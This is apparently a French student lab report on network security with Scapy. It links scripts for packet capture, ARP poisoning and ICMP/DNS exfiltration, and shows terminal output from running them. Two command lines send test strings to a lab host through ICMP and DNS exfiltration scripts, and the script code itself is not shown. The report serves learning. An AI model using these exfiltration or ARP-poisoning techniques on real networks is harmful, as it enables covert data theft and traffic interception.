# TP4 SECU : Exfiltration


# Sommaire

- [I. Getting started Scapy](#i-getting-started-scapy)
- [II. ARP Poisoning](#ii-arp-poisoning)
- [II. Exfiltration ICMP](#ii-exfiltration-icmp)
- [III. Exfiltration DNS](#iii-exfiltration-dns)



# I. Getting started Scapy


🌞 **`ping.py`**

[ping.py](./script/ping.py)


🌞 **`tcp_cap.py`**

[tcp_cap.py](./script/tcp_cap.py)

```bash
nico@debian:~/Documents/Resaux-B2/Tp4$ tcp_cap.py
TCP SYN ACK reçu !
- Adresse IP src : 216.58.214.78
- Adresse IP dest : 10.33.73.226
- Port TCP src : 443
- Port TCP dst : 52260
```

🌞 **`dns_cap.py`**

```bash
nico@debian:~/Documents/Resaux-B2$ sudo /bin/python3 /home/nico/Documents/Resaux-B2/Tp4/dns_cap.py
[sudo] password for nico: 
DNS Answer 172.67.74.226
DNS Answer 104.26.11.233
DNS Answer 104.26.10.233
```


[dns_cap.py](./script/dns_cap.py)

🌞 **`dns_lookup.py`**

```bash
nico@debian:~/Documents/Resaux-B2$ sudo /bin/python3 /home/nico/Documents/Resaux-B2/Tp4/dns_lookup.py
Begin emission:
Finished sending 1 packets.
.*
Received 2 packets, got 1 answers, remaining 0 packets
L'une des ip de ynov.com est: 104.26.11.233
```

[dns_lookup.py](./script/dns_lookup.py)

# II. ARP Poisoning


🌞 **`arp_poisoning.py`**

[arp_poisoning.py](./script/arp_poisoning.py)

# II. Exfiltration ICMP


🌞 **`icmp_exf_send.py`**

```bash
nico@debian:~/Documents/Resaux-B2$ sudo /bin/python3 /home/nico/Documents/Resaux-B2/Tp4/icmp_exf_send.py 10.33.67.174 j
.
Sent 1 packets.
```

[icmp_exf_send.py](./script/icmp_exf_send.py) 
[le packet capturé par wireshark](./wireshark/packet_icmp.pcapng)

# III. Exfiltration DNS

🌞 **`dns_exfiltration_send.py`**

```bash
nico@debian:~/Documents/Resaux-B2$ sudo /bin/python3 /home/nico/Documents/Resaux-B2/Tp4/dns_exfiltration_send.py 10.33.67.174 voici_une_string_de_plus_de_20_caracteres
.
Sent 1 packets.
```

[dns_exfiltration_send.py](./script/script/dns_exfiltration_send.py) 

[la capture du packet dns avec wireshark](./wireshark/packet-dns.pcapng)
